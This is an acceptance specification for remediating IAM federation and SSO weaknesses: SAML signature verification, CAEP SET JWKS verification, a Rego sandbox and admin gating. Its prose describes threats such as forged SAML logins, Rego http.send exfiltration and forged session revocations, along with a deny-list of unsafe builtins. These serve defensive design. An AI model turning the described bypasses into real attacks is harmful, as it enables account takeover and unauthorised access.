# Sub-phase W3.1 — Remediation Chunk 5: Federation / SSO internals — Acceptance

> **Status**: DRAFT v2 (revised per KAC-173 against acceptance-reviewer findings on v1; awaiting re-review per workspace `CLAUDE.md` §Запреты #1).
> **Date**: 2026-05-24
> **YouTrack**: KAC-W3.1 (subtask of `KAC-iam-prod-ready` master epic; revision tracked by KAC-173, sibling of W3.2 observability / W3.3 SPIRE+Cilium / W3.4 freeze).
> **Author agent**: `acceptance-author`
> **Reviewer agent**: `acceptance-reviewer`
> **Revision note**: v1 (`2026-05-24` original) was returned `❌ CHANGES REQUESTED`; key findings — (a) #42 direction misread (egress sign vs ingress verify), (b) duplicate `jwks_keys` vs existing `oidc_jwks_keys` from migration `0014`, (c) #40/#41 scope overlap with W2.B. **Resolution** (per `KAC-170-acceptance-review-report.md` Option Y, ratified by master plan §W3 row source-of-truth): W2.B = scaffolding for SSO/SAML/CAEP-egress; W3.1 = full verify/sign of remaining surface; **#41 drops from W3.1 entirely** (lives in W2.B B.2 next to SCIM endpoints — master plan §W3 row excludes #41); **#42 is INGRESS verify** of inbound SETs against trusted external IdP's JWKS (egress signing lives in W2.B B.8); no `jwks_keys`-table duplication — W3.1 references existing `oidc_jwks_keys` (if needed for OUR signing keys) and adds new `iam_trusted_idp_jwks_cache` (cache of external IdP public keys). Final W3.1 scope: **6 findings** (#21, #23, #25, #26, #40, #42).
> **Target repos**:
>   - **Primary**: `PRO-Robotech/kacho-iam` —
>     - `internal/apps/kacho/api/internal_authorize/handler.go` (`ReloadModel` #25, `RunRegoTest` #26)
>     - `internal/service/authorize_service.go` (`CheckRelation` context plumbing #23)
>     - `internal/apps/kacho/api/saml/sp_handler.go` (SAML AuthnResponse verify #40 — replaces W2.B B.1 501-guard with real XML-DSig verification)
>     - `internal/handler/iamhooks/caep_ingress_handler.go::parseSETBody` (CAEP SET ingress signature verify #42 — replaces «base64-decode without verify» with JWS verification against trusted IdP's JWKS)
>     - `internal/service/jwks_verifier/` (new package — fetch + cache trusted IdP JWKS, verify inbound SET JWS)
>     - `internal/service/opa_scope/allowlist.go` (new) + handler hooks in `internal_authorize_service` (#21)
>     - `migrations/00XX_opa_scope_allowlist.sql` — `kacho_iam.opa_scope_allowlist` table (per-tenant whitelist of legitimate OPA scope-strings)
>     - `migrations/00XX_saml_request_state.sql` — `kacho_iam.saml_request_state` table (per-RequestID single-use replay protection; moved from W2.B per scope split — now meaningful with signature verify present in W3.1)
>     - `migrations/00XX_iam_trusted_idp_jwks_cache.sql` — `kacho_iam.iam_trusted_idp_jwks_cache` (cached external JWKS per trusted IdP, refresh-on-demand)
>     - **Migration numbers**: not hard-coded here — assigned at impl-start to next-available index per `KAC-170-acceptance-review-report.md` coordination sketch (last applied = `0025_nlb_operator_target_manager_roles.sql`; W2.A/W2.B/W2.C merge before W3.1, so W3.1 numbers land after their assignments).
>   - **Touched (kacho-proto)**: `kacho/cloud/iam/v1/internal_authorize_service.proto` (`RunRegoTest` request gets `module_imports[]` allow-list field + `cpu_timeout_ms` field; response gets `denied_reason` for sandbox rejections). No new RPC or service.
>   - **Touched (kacho-api-gateway)**: nothing (W3.1 only modifies behaviour behind existing routes; SAML ACS / CAEP ingress webhook / SCIM endpoints / `/.well-known/jwks.json` for OUR keys (if exposed) — all wired in W2.B).
>   - **NOT touched**: `kacho-corelib`, `kacho-vpc`, `kacho-compute` — no horizontal cross-cutting needed; no new edges added beyond kacho-iam ↔ external IdP (HTTP JWKS fetch from per-tenant configured URL).
> **Branch (all repos)**: `KAC-W3.1` (off `main`).
> **Parent epic plan**: `docs/superpowers/plans/2026-05-23-iam-prod-ready-master.md` Wave 3 (§W3 row: «Chunk 5 (federation/SSO internals: #21/#23/#25/#26/#40/#42)» — **#41 not listed**).
> **Wave plan**: `docs/superpowers/plans/2026-05-23-iam-prod-ready-wave3.md` §W3.1 (TBD — детальный план пишется при старте Wave 3).
> **Source of finding-level requirements**: `docs/superpowers/plans/2026-05-21-iam-authz-review-remediation-plan.md` §1.3 Chunk 5 (items 5.1, 5.2, 5.3, 5.4, 5.5, 5.8). **#41 SCIM Basic-auth** — per master plan §W3 row scoped to W2.B B.2 (where SCIM endpoints live); **#42 direction** per remediation plan lines 90 + 186: file `caep_ingress_handler.go::parseSETBody`, fix «проверять подпись SET-JWT по JWKS доверенного IdP» → **INGRESS verify**, not egress sign.
> **Predecessors (must be `main`-merged before W3.1 impl starts)**:
> - **W2.B B.1** (SAML ACS endpoint wired with explicit-disabled guard returning 501 per remediation-plan OQ-5). W3.1 #40 replaces the 501 guard with the **actual** signature verification path.
> - **W2.B B.2** (SCIM v2 REST endpoints wired with Basic-auth per-tenant via `scim_basic_credentials` — **#41 closed there**, not in W3.1).
> - **W2.B B.8** (CAEP **egress** push pipeline + EGRESS signing — kacho-iam emits SETs signed by OUR private key from `oidc_jwks_keys`, exposes `/.well-known/jwks.json` for subscribers). W3.1 #42 closes the **inverse** gap — INGRESS verify of SETs we receive from external CAEP-emitting IdPs.
> - **W2.A** (catalog/permissions unification, Chunk 3). W3.1 #21 OPA-scope-allowlist is per-tenant; the catalog defines the **set of catalogued scopes** that the allowlist references. W2.A must merge first so the allowlist enum-table can be populated by bootstrap from the catalog.
> - **W1.6** (Remediation Chunk 2). W1.6 §4.11 introduced the **explicit read-only allowlist** anti-anon interceptor — by default `Internal*` mutating RPCs (`ReloadModel`, `RunRegoTest`) are already anonymous-denied. W3.1 #25 is an explicit **reaffirm + cluster-admin gate** on top of anti-anon; without W1.6, anonymous bypass was possible via missing suffix match. W1.6 closes the anonymous bypass; W3.1 closes the *authenticated-non-admin* bypass.
>
> **Why W3.1 is the last correctness-hardening chunk before freeze**: per remediation plan §Часть 3 «5 чанков», Chunk 5 deals with federation / SSO internals — the surface most exposed to **external** principals (IdP-driven, SCIM-driven, vendor CAEP receiver). With #41 reassigned to W2.B B.2, W3.1 closes the **six remaining** Chunk-5 findings — bringing the IAM prod-ready DoD (per master plan §Definition of Done) to «0 stub on surface, 0 latent-P0». W3.2 (observability) + W3.3 (SPIRE+Cilium) + W3.4 (freeze checklist) are non-correctness chunks layered on top.

---

## 0. Преамбула — что эта sub-итерация (précis)

W3.1 закрывает **шесть** findings из remediation plan §1.3 Chunk 5 (per master plan §W3 row), разбитых на три тематических группы:

1. **OPA / Rego authz internals** (#21, #25, #26) — control-plane endpoints для admin-UI и oncall, через которые сейчас можно (a) сослаться на любую произвольную scope-строку и обойти каталогизированный набор (#21), (b) перезагрузить FGA-модель без аутентификации/cluster-admin-проверки (#25), (c) выполнить arbitrary Rego-программу без sandbox-ограничений (#26). #25/#26 уже частично закрыты W1.6 anti-anon allowlist (anonymous → 401); W3.1 **дополнительно** гейтит на cluster-admin grant и расширяет ту же логику на #26.
2. **Federation conditional binding context** (#23) — `IAMService.CheckRelation` сейчас игнорирует `request_context` jsonb-поле (ABAC attributes: MFA-freshness, source-IP, device-trust, time-of-day). Поле существует в proto (KAC-127 frozen), но handler не пробрасывает его в OpenFGA через `Conditions` evaluation feature. Эффект: conditional bindings (e.g. «admin only with MFA fresh») всегда deny на internal-gate; admin-UI tests show «MFA required» as static deny.
3. **External-IdP-facing verify hardening** (#40, #42) — два endpoint'а, через которые external systems взаимодействуют с iam:
   - #40 SAML AuthnResponse — XML-signature verification + replay protection + recipient/audience binding. W2.B B.1 поставила только защиту-guard (501) против JIT-provisioning без verify; W3.1 — реальная реализация (плюс перенос новой `saml_request_state` миграции из W2.B в W3.1 — она бессмысленна без signature verify, поэтому логически принадлежит W3.1).
   - #42 CAEP SET signature INGRESS verify — `caep_ingress_handler.go::parseSETBody` сейчас base64-декодит JWT без verification. W3.1 поставляет JWS verify против JWKS **доверенного IdP** (внешнего эмиттера). Защищает control-plane от подделанных session-revocation от любого in-cluster actor'а, получившего `X-Kacho-Hook-Token`. **Не путать с W2.B B.8** (egress sign — kacho-iam подписывает SETs, исходящие к нашим subscribers, и публикует свои public keys через `/.well-known/jwks.json`). #42 = INGRESS; B.8 = EGRESS — orthogonal code paths.

**#41 SCIM Basic-auth — DROPPED from W3.1 scope.** Per master plan §W3 row («Chunk 5 (federation/SSO internals: #21/#23/#25/#26/#40/#42)») — #41 не listed. Логически: SCIM Basic-auth — это authn для SCIM endpoints; те wired в W2.B B.2; auth-credential storage (`scim_basic_credentials`-table + Basic-auth middleware) — естественная часть B.2 пакета. См. §0.1 ниже.

Каждый из шести findings закрывается одной парой `RED (failing integration/newman test) → GREEN (impl)`. См. §5 для распределения; §6 — GWT сценарии; §7 — test plan; §8 — DoD; §9 — vault updates.

W3.1 **не** меняет authz-decision pipeline (gateway middleware / FGA evaluator) — это W1.3/W1.5/W2.A. W3.1 **не** добавляет новые RPC в *публичные* сервисы (FederationExchangeService / SAKeyService / AccessBindingService — без изменений). W3.1 расширяет **только** Internal-admin RPCs (`ReloadModel` / `RunRegoTest`) и behaviour-of-existing-endpoints (SAML ACS verify; CAEP ingress verify).

### 0.1 W3.1 НЕ включает

- **#41 SCIM Basic-auth** — implemented in **W2.B B.2** (per master plan §W3 row exclusion + logical co-location with SCIM endpoints, which W2.B B.2 wires). W3.1 does not touch SCIM auth code, `scim_basic_credentials`-table, or per-tenant SCIM credential RPCs. **Note**: previous v1 of this doc included #41 — those §5.41 / §6.41 / OQ-W3.1 / DEC-W3.1-5 (bcrypt cost) sections moved to W2.B B.2 revision (KAC-172).
- **CAEP egress signing + `/.well-known/jwks.json` for OUR keys** — W2.B B.8 territory. W3.1 #42 covers the **inverse** direction: verifying signatures of SETs we **receive** from external CAEP-emitting IdPs. If W2.B B.8 elects to expose OUR `/.well-known/jwks.json` for subscribers, the JWKS publication path is B.8's; W3.1 introduces **no new** publication endpoint for our keys.
- **Observability customisation** — VictoriaMetrics dashboards, alert rules, anti-anon-deny / SAML-reject / SET-badsig / rego-sandbox-block / opa-scope-deny metrics → **W3.2** (`sub-phase-W3.2-observability-customisation-acceptance.md`, TBD). W3.1 emits **structured logs** with `event:` tags (`saml_signature_invalid`, `caep_ingress_signature_invalid`, `caep_jwks_lookup_failed`, `rego_sandbox_blocked`, `opa_scope_not_allowlisted`) — dashboard wiring is W3.2.
- **SPIRE + Cilium wiring** — kacho-iam за SVID mTLS identity → **W3.3** (TBD). W3.1 assumes existing K8s NetworkPolicy + token-based authn between iam and gateway; SPIRE-based identity for SAML/CAEP-IdP-side клиентов — out of scope (those are external systems, не in-cluster workloads).
- **Freeze checklist** — final gate before Wave 4 freeze (security review, pentest readiness, runbook completeness) → **W3.4** (TBD).
- **OPA bundle resilience** — bundle fetch / signature verify on the OPA-sidecar side (referenced in W1.3 §0.1 as out-of-scope of gateway). The Rego sandbox in #26 is for `InternalAuthorize.RunRegoTest` admin-diagnostic path only — **not** the runtime evaluator. Runtime OPA-sidecar bundle path is hardened separately (KAC-127 Phase 3 already requires bundle-signing JWS; verified by sidecar config `bundle-signing-key` in `helm/umbrella/values.yaml`).
- **OPA-VERIFY follow-up (#24)** — verifying that fail-closed-для-мутаций при недоступном OPA реально enforced на gateway interceptor (remediation plan §1.3 Chunk 5 item 5.9). **Deferred** — not in master plan §W3 row, lives in a future «W3.1.1 follow-up» chunk (separate KAC), classified as gateway-side bundle-signature hardening, not iam-side.
- **#20 Port segregation NetworkPolicy** — restricting `grpc-internal` (9091) to cluster-internal sources via NetworkPolicy (remediation plan §1.3 Chunk 5 item 5.7). **Deferred** — not in master plan §W3 row; lives in W3.3 (SPIRE+Cilium) where the broader NetworkPolicy story is told.
- **CheckRelation в публичном `AuthorizeService.Check`** — #23 затрагивает только `InternalIAMService.CheckRelation` (admin-UI checker / gateway-internal). Public `AuthorizeService.Check` уже плюмит `request_context` через OpenFGA Conditions feature (verified in W1.3 cross-check `authorize_service.go::Check`). W3.1 закрывает **только** internal-side рассинхрон.
- **Federation Exchange scope-allowlist (#21 federation-side)** — disambiguation: remediation plan §1.3 Chunk 5 item 5.1 «#21 federation scope-allowlist» — это про `FederationExchangeService.Exchange` `RequestedScope`-intersection с `FederationTrustPolicy.allowed_scopes[]`. Та часть **уже** закрыта в **W2.B B.6** (`FederationTrustPolicy.allowed_scopes` field + migration + Exchange intersection). W3.1 #21 — **другая** scope-allowlist: OPA-endpoint-level «какие scope-строки legitimate для `RunRegoTest` `module_imports[]` field». Эти две allowlist'ы орто́гональны (Federation = OAuth scope; OPA = policy-package scope). См. §3 Decision DEC-W3.1-1 для номенклатуры.
- **Rego unit-test runner for production rules** — `RunRegoTest` остаётся admin-diagnostic RPC; production OPA evaluation идёт через OPA-sidecar, не через iam-RPC. W3.1 sandbox защищает админ-инструмент от RCE-style abuse, не reimplements OPA.

### 0.2 Findings table (W3.1 scope = 6 findings)

> **Source-line precision note**: line numbers below reflect `main`-branch state as of 2026-05-24 (last verified commit `9b36fa1` per workspace git log). Impl-author SHOULD re-verify line numbers at branch-creation time — refactors between this acceptance approval and impl start may shift them by ±5.

| # | Sev | File (target — main 2026-05-24) | Симптом | Fix |
|---|---|---|---|---|
| **#21** | P0 | `internal/apps/kacho/api/internal_authorize/handler.go::RunRegoTest` (plus any future OPA scope-accepting handler in the same package) | Handler принимает arbitrary `module_imports[]` (after #26 sandbox adds the field) или эквивалент в существующем surface — без проверки, что строки каталогизированы. Permits enumeration of internal policy packages и потенциально eval против неполной/тестовой policy. | Добавить per-tenant allowlist `kacho_iam.opa_scope_allowlist (tenant_id text, scope text, created_at timestamptz, PRIMARY KEY (tenant_id, scope))`. На handler-уровне: до eval — `SELECT 1 FROM opa_scope_allowlist WHERE tenant_id IN ($caller_tenant, '*system') AND scope=$req_scope` — если 0 rows → `codes.PermissionDenied` с текстом `"Illegal argument scope: scope %q is not in tenant allowlist"`. Bootstrap-seed для well-known scopes: `data.iam.users`, `data.iam.roles`, `data.iam.bindings`, `data.iam.projects`. Empty allowlist (mis-bootstrap) → **fail-closed all** (`PermissionDenied`), не «empty = allow-all». Scope covers `RunRegoTest.module_imports[]` only in current surface; any future OPA REST endpoint that accepts scope strings adds its gate at registration time (out of W3.1 scope). |
| **#23** | P1 | `internal/service/authorize_service.go::CheckRelation` (внутренний путь, отличный от public `Check`); `internal/apps/kacho/api/internal_iam/handler.go::Check` (proxy в `authorize_service.CheckRelation`) | `request_context` поле (jsonb из proto `CheckRelationRequest`, ABAC attributes — `mfa_fresh`, `source_ip`, `device_trust_level`, `time_of_day`) **не пробрасывается** в OpenFGA Conditions evaluation. ABAC-aware conditional bindings (e.g. `permit admin only if mfa_fresh==true`) всегда возвращают deny на internal path. | `CheckRelation` строит OpenFGA `Context` map (string→`structpb.Value`) из `request_context.AsMap()`, передаёт в `client.Check(...)` SDK-параметром `Context` (per OpenFGA Conditions feature, https://openfga.dev/docs/modeling/conditions). Conditions defined в FGA model evaluate against this context map. Существующий path public `Check` уже plumbит то же (verified). Malformed `request_context` (не-jsonb / nested-too-deep / > 32 keys / > 1KB per value) → `codes.InvalidArgument`. |
| **#25** | P0 | `internal/apps/kacho/api/internal_authorize/handler.go::ReloadModel` (мутирует `h.currentModelID` без auth-check beyond W1.6 anti-anon) | До W1.6: anonymous мог вызвать `InternalAuthorizeService.ReloadModel` — внутренний listener-level trust ассумировал, что cluster-mTLS уже фильтрует, но в dev/test без mTLS — anonymous bypass. После W1.6: anti-anon allowlist denies anonymous, но **authenticated non-admin** всё ещё может вызвать. | На handler-уровне: `principal := authzguard.PrincipalUserID(ctx); if principal == "" { return PermissionDenied("authentication required") }` (defensive reaffirm anti-anon); затем `if !s.iam.IsClusterAdmin(ctx, principal) { return PermissionDenied("ReloadModel requires cluster-admin grant") }`. Cluster-admin = `cluster_admin_grants`-row (W1.5 break-glass approve) OR bootstrap-principal. Symmetric для `RunRegoTest`. Audit log: `event: iam_admin_reload_model_ok/denied, principal:, model_id:, outcome:`. |
| **#26** | P0 | `internal/apps/kacho/api/internal_authorize/handler.go::RunRegoTest` (current impl returns `Unimplemented`; W3.1 implements admin-diagnostic + sandbox) | Если включить реализацию без sandbox: arbitrary Rego program execution в process-памяти iam → DOS (infinite loop, memory exhaustion via large data ingest), exfiltration via `http.send`, side-channel via non-deterministic builtins (`time.now_ns`, `rand.*`). | Sandbox layered: (a) **parser-time deny-list** — отказ при наличии truly unsafe builtins (network/non-determinism only — see §5.26 for full list with per-builtin rationale); (b) **CPU budget** — `ctx, cancel := context.WithTimeout(ctx, req.GetCpuTimeoutMs() * time.Millisecond); defer cancel()`, hard cap 5000ms via Go config; (c) **iteration / size proxy for memory** — `rego.RuntimeOpts(rego.RegoMaxIterations(100_000))` (true memory cap unavailable in upstream OPA Go SDK; iteration + CPU together bound the worst-case memory growth — see DEC-W3.1-2 honest framing); (d) **import allowlist** — request-field `module_imports[]` ⊆ catalogued scopes via #21 allowlist; unknown import → reject. Combined with #25 (cluster-admin gate) — only trusted operators can even reach the sandboxed eval. |
| **#40** | P0 | `internal/apps/kacho/api/saml/sp_handler.go` (W2.B B.1 reads `subject` / `email` from raw form values; signature verify path is `OnSAMLAssertion: nil` → ACS returns 501; W3.1 fills it in) | Without verify: a malicious POST to `/saml/v2/acs` could JIT-provision arbitrary user (`email=admin@victim.com`). W2.B B.1 prevented it by returning 501 — defensive but blocks legitimate SAML SSO. W3.1 enables actual verify so SSO works. | Full XML-DSig verification path (use `crewjam/saml` library — see DEC-W3.1-3 with POC-verify caveat): (1) load IdP cert (per-tenant from `federation_trust_policies.idp_cert_pem`); (2) verify XML signature on `<samlp:Response>` AND on `<saml:Assertion>` — fail if either invalid; (3) signature algorithm allowlist: `rsa-sha256`, `rsa-sha384`, `rsa-sha512` — reject `rsa-sha1` and `dsa-*`; (4) `InResponseTo` binding — must match a previously-issued `<samlp:AuthnRequest>` ID (stored in `saml_request_state` table with TTL 5min, deleted on first match → replay-proof); (5) `NotBefore` (must be ≤ now+skew) and `NotOnOrAfter` (must be > now-skew) window check (clock skew tolerance ±60s); (6) `Recipient` = `https://<our-acs-url>` (constant from config); (7) `Audience` = our SP entity-ID. All seven checks → JIT-provision user; any fail → reject + structured audit log. Wire `OnSAMLAssertion: h.handleVerifiedAssertion`. |
| **#42** | P1 | `internal/handler/iamhooks/caep_ingress_handler.go::parseSETBody` (`:166` — comment says «Phase 2: декодируем payload без verification; production (Phase 8) — JWKS-based verify»; single auth border = `X-Kacho-Hook-Token` shared secret) | Без signature verify: обладатель shared `X-Kacho-Hook-Token` секрета (любой in-cluster компонент с доступом к secret-store) подделывает session-revocation для любого user — submitter SET sets `sub_id` arbitrary, ingest handler emits `subject_change_outbox` row → real revocation effect. Outside-cluster threat (если CAEP ingress webhook когда-нибудь exposed external): любой external actor с обладанием shared token. | (1) New table `kacho_iam.iam_trusted_idp_jwks_cache (idp_id text, kid text, alg text, public_key_pem text, fetched_at timestamptz, expires_at timestamptz, PRIMARY KEY (idp_id, kid))`. (2) New package `internal/service/jwks_verifier/`: `FetchAndCache(ctx, idpID, jwksURL) error` (HTTP GET, parse JWK set, upsert rows with cache-control-derived `expires_at`); `Verify(ctx, idpID, token string) (claims, error)` — extract `kid` + `alg` from JWS header, look up `(idpID, kid)` in cache (if miss: refresh once; if still miss → reject), assert `alg` is in asymmetric allowlist (`RS256`, `RS384`, `RS512`, `ES256`, `ES384`, `ES512`) — reject `none`/`HS*` (symmetric), then verify signature. (3) `parseSETBody` integration: load `idp_id` per request (from `X-Kacho-Hook-Source` header или per-tenant config), call `jwksVerifier.Verify(...)`, on error → 400 + audit log `caep_ingress_signature_invalid`. (4) Trusted IdP registration: out of W3.1 impl scope (admin RPC for managing trusted IdPs is W4-admin-UI sprint); for W3.1 — seed `iam_trusted_idp_jwks_cache` via SQL fixture for known test IdP in tests/dev. |

### 0.3 Зависимости и cross-chunk сцепления

- **W2.B B.1 + W2.B B.2 + W2.B B.8 must be `main`-merged before W3.1 impl.** Without W2.B B.1: no SAML ACS endpoint to verify. Without W2.B B.8: no CAEP egress sign + JWKS publication infrastructure для symmetric understanding. (B.2 SCIM is parallel — W3.1 doesn't touch it; just listed for completeness of W2.B closure.)
- **W2.A (catalog/permissions unification)**: bootstrap-seed для `opa_scope_allowlist` (#21) пулит scope-список из единого каталога; без W2.A — захардкоженный список из 4 scopes (`data.iam.users/roles/bindings/projects`).
- **W1.6 (Chunk 2 anti-anon allowlist)**: предусловие для #25 + #26 — anti-anon уже отсекает anonymous; W3.1 поверх добавляет cluster-admin requirement.
- **W1.5 (FGA grant outbox)**: `cluster_admin_grants` table populated through `bootstrap_admin` path + W1.5 BreakGlass.ApproveB path. W3.1 #25 reads from this table for cluster-admin check.

### 0.4 Финальный gate W3.1 vs freeze

После W3.1 merge: ноль stub'ов на surface (включая SAML 501-guard от W2.B B.1; включая CAEP ingress «декодит payload без verification» comment от current main). Все 6 findings closed. Master plan §«Definition of Done» pkt 1-2 («0 stub / 0 disabled-by-config», «44 findings closed») — на 6 closer to total.

---

## 1. Связь с регламентом (нормативно)

| Регламент | Где соблюдаем |
|---|---|
| **Запрет #1** (acceptance-gate) | этот документ — gate; impl стартует только после ✅ APPROVED от `acceptance-reviewer`. |
| **Запрет #2** (no «yandex») | ни в коде, ни в комментариях, ни в тестах, ни в audit-event names. |
| **Запрет #3** (no ORM) | handwritten pgx + sqlc для всех новых таблиц (`opa_scope_allowlist`, `saml_request_state`, `iam_trusted_idp_jwks_cache`). |
| **Запрет #4** (no cross-service cascade) | within-iam-DB only. SAML state cascade — same-schema. JWKS cache cascade — same-schema. |
| **Запрет #5** (no edit applied migration) | 3 новые migration файла (numbers assigned at impl-start per coordination doc — не editing prior 0001-0025). |
| **Запрет #6** (`Internal.*` separation) | `ReloadModel`, `RunRegoTest` — **строго на internal-listener (port 9091)**. SAML ACS (`/saml/v2/acs`) и CAEP ingress webhook (`/iam/v1/hooks/caep`) — public (vendor-callable, как должно быть). См. CLAUDE.md §«Запреты» #6. |
| **Запрет #7** (no broker) | Inbound SET verify — sync request-response; downstream subject-change emit — through existing `subject_change_outbox` (W1.2 path); no Kafka/NATS. |
| **Запрет #8** (DB-per-service) | Все 3 новые таблицы — в `kacho_iam`-схеме. Никаких cross-DB FK. |
| **Запрет #9** (mutation = async) | `ReloadModel`, `RunRegoTest` — admin-diagnostic, sync (как уже было); не требуют `Operation`-envelope (per §0 of `02-data-model-and-conventions.md`, internal-admin RPCs могут быть sync). SAML JIT-provisioning user — генерирует `Operation` через существующий `UserService.Create` use-case. CAEP ingress — emits `subject_change_outbox`-row (async path), 200 OK returned synchronously to caller. |
| **Запрет #10** (within-service refs DB-level) | `saml_request_state.request_id PRIMARY KEY` — PK conflict (23505) ловит replay (deterministic). `iam_trusted_idp_jwks_cache (idp_id, kid) PRIMARY KEY` — composite uniqueness; UPSERT on JWKS refresh. `opa_scope_allowlist (tenant_id, scope) PRIMARY KEY` — composite uniqueness. Никакого software refcheck — все инварианты на DB-уровне. |
| **Запрет #11** (no TODO / no tech debt) | Все 6 findings закрываются полностью в W3.1; никаких `TODO(KAC-N): implement later`. Если acceptance-reviewer считает SAML/CAEP scope слишком большим — split на W3.1a/W3.1b (отдельные acceptance docs), не TODO. |
| **Запрет #12** (test-first STRICT) | RED phase commit ПЕРВЫМ: integration tests + newman cases на каждый из 6 findings; GREEN phase — по одному finding'у с per-fix evidence «RED→GREEN» в PR описании. См. §5 + §7. |
| **Запрет #13** (test-only PR ≠ product fix) | W3.1 — feature/fix PR, не test-only — так что #13 не директивно применим; но фиксы тестов от W2.B B.1/B.8 (если W2.B revisions выявили pre-existing test gaps) — отдельный PR, не миксуем с W3.1. |
| **CLAUDE.md §«Инфра-чувствительные данные»** | **External IdP public keys (cached in `iam_trusted_idp_jwks_cache`)** — public-key material; non-sensitive in cryptographic sense, но не выставляются user-facing через RPC (только internal cache for verify path use). **SAML IdP cert PEM** (in `federation_trust_policies`) — already established as internal-only storage. **W3.1 does NOT introduce any new private-key storage** (egress signing lives in W2.B B.8 with existing `oidc_jwks_keys`). |
| **CLAUDE.md §«Within-service refs DB-уровень обязателен»** | См. Запрет #10 выше — composite PK, PK conflict semantics, atomic UPSERT for cache refresh; никаких TOCTOU patterns. |
| **Vault discipline** | KAC-W3.1 trail; NEW `resources/iam-opa-scope-allowlist.md`, NEW `resources/iam-saml-request-state.md`, NEW `resources/iam-trusted-idp-jwks-cache.md`, NEW `packages/iam-service-opa-scope.md`, NEW `packages/iam-service-jwks-verifier.md`, UPDATE 3 RPC notes + NEW edges `edges/iam-to-saml-idp.md`, `edges/iam-to-external-idp-jwks.md`, `edges/iam-to-caep-ingress.md`. См. §9. |

---

## 2. Глоссарий

- **SET** (Security Event Token) — RFC 8417 формат JWT-based event token для CAEP / RISC / SSE стандартов. Тело — set of JWT claims включая `iss`, `aud`, `iat`, `jti`, `sub_id`, `events`-map (e.g. `{"https://schemas.openid.net/secevent/caep/event-type/session-revoked": {...}}`). Подписывается JWS (RFC 7515).
- **JWS** (JSON Web Signature) — RFC 7515 формат подписи. `alg=RS256` — RSA-SHA256, стандарт для SSE/CAEP.
- **JWKS** (JSON Web Key Set) — RFC 7517 формат для публикации публичных ключей. Endpoint convention: `/.well-known/jwks.json`. Subscribers fetch JWKS, match `kid` header из JWT к ключу в set'е, verify signature.
- **JWKS verify (ingress, W3.1 #42 sense)** — kacho-iam как **получатель** SET'ов от внешнего CAEP-эмитирующего IdP: fetch IdP's JWKS endpoint (URL configured per trusted IdP), cache public keys, verify inbound SET signature. *Не путать с egress sign (W2.B B.8 sense)*: kacho-iam как **отправитель** signed SETs к нашим subscribers — public keys нашей подписной пары exposed в OUR `/.well-known/jwks.json`.
- **Rego sandbox** — set of restrictions на arbitrary Rego execution: (a) AST-level deny-list для unsafe built-ins (network + non-determinism only — see §5.26 honest rationale), (b) CPU timeout (`context.WithTimeout`), (c) iteration cap as memory-pressure proxy (OPA Go SDK does not expose hard memory cap; iteration + timeout together bound worst-case), (d) import allowlist (только catalogued data sources).
- **OpenFGA Conditions** — feature in OpenFGA model для conditional tuples (https://openfga.dev/docs/modeling/conditions). Synth `condition` keyword в model definition; `Check`-call receives `Context map[string]interface{}` which condition evaluates against. W3.1 #23 uses this in place of pre-condition workarounds (e.g. raw contextual-tuple injection).
- **Scope-allowlist (OPA)** — per-tenant whitelist of legitimate OPA scope-strings (e.g. `data.iam.users`). Disambiguation от Federation scope-allowlist (W2.B B.6, `FederationTrustPolicy.allowed_scopes` — OAuth scope intersection): OPA scope = policy package address; OAuth scope = OAuth2 access-token grant. См. DEC-W3.1-1.
- **Replay protection (SAML)** — once-only consumption: `<samlp:Response>.InResponseTo` записывается в `saml_request_state` table при выпуске `<samlp:AuthnRequest>`; на ACS-receipt — atomic delete of matching row; вторичный POST с тем же `InResponseTo` → 0 rows deleted → 401.
- **Cluster-admin grant** — `cluster_admin_grants`-row (KAC-122 §5; W1.5 BreakGlass.ApproveB writes). FGA-relation `cluster:default#system_admin@user:X`. Used for high-priv admin RPCs (ReloadModel, RunRegoTest).
- **Trusted IdP** — external SSO/CAEP-emitting IdP whose signed events we accept (e.g. Okta-prod, Azure-AD-tenant-xxx). Identified by `idp_id` string (typically `<vendor>-<tenant>` or org-chosen alias). JWKS URL per trusted IdP — out-of-band registered.

---

## 3. Decisions (принимаются acceptance-reviewer'ом до старта impl)

| ID | Решение |
|---|---|
| **DEC-W3.1-1** (#21 storage) | **OPA scope-allowlist хранится в DB как table `kacho_iam.opa_scope_allowlist (tenant_id text, scope text, ...)`, не как proto enum.** Reasoning: (a) per-tenant extensibility — different tenants могут добавить own custom OPA data sources (W3+ когда tenant-specific Rego packages поддерживаются); (b) admin-UI editable без proto-regenerate cycle; (c) bootstrap-seed populated from W2.A catalog, но modifiable runtime. **Не** proto enum: hardcoded list требует proto-change для добавления scope (high-friction). **Scope of #21 enforcement is limited to existing surface**: `RunRegoTest.module_imports[]` field — the only handler in current `internal_authorize` package that accepts a scope-string. Future OPA REST endpoints (`/opa/compile/v1`, `/opa/data/v1/iam/*` if added in some later sub-phase) add their gate at registration time, separately scoped (not W3.1's responsibility). |
| **DEC-W3.1-2** (#26 sandbox enforcement — **honest framing**) | **Sandbox bound по 4 dimensions одновременно, with explicit honesty about memory cap**: (a) parser-time AST walk + built-in deny-list (compile-time reject); (b) `context.WithTimeout(req.cpu_timeout_ms || default 5000)` для CPU cap; (c) **iteration cap via `rego.RuntimeOpts(rego.RegoMaxIterations(100_000))`** — **OPA Go SDK does NOT expose a hard `RegoMaxMemoryBytes`-style memory cap** (verified against `open-policy-agent/opa@v0.x` source); iteration limit + CPU timeout **together** bound worst-case memory growth (Rego allocs scale with iterations × rule cardinality). True memory cap would require cgroup-level enforcement on the iam pod (out of OPA-SDK layer — separate Helm chart tweak, not W3.1 scope). For diagnostic use-case behind cluster-admin gate (#25 parity), 100k iterations + 5s CPU + 4 forbidden-builtin list = acceptable; (d) `module_imports[]` request-field — explicit allowlist ⊆ catalogued scopes (#21 parity). Если any dimension fails → `codes.PermissionDenied` с `denied_reason` field в response (new proto field per §0 table). Не используем seccomp/cgroups — слишком тяжело для in-process RPC; pure-Go SDK-level enforcement достаточен для diagnostic use-case (cluster-admin only path per #25). |
